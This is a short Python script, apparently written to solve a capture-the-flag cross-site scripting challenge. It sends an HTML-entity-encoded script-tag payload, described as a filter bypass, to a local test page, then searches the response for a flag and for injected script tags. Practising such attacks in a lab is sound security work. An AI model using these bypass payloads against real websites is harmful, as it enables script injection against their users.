import requests
import re

target = "http://127.0.0.1:32889/page"

# Working bypass payload
working_payload = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert('test')&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

print("Getting full response with working payload...")
print("="*70)

try:
    response = requests.get(target, params={'name': working_payload}, timeout=5)
    
    print(f"Status: {response.status_code}")
    print(f"Length: {len(response.content)} bytes")
    print(f"\nFull HTML Response:")
    print("="*70)
    print(response.text)
    print("="*70)
    
    # Search for flag patterns
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"\n*** FLAG FOUND: {flags[0]} ***")
    
    # Look for script tags in response
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL)
    if scripts:
        print(f"\nFound {len(scripts)} script tags:")
        for i, script in enumerate(scripts, 1):
            print(f"\n--- Script {i} ---")
            print(script[:500])
    
except Exception as e:
    print(f"ERROR: {str(e)}")

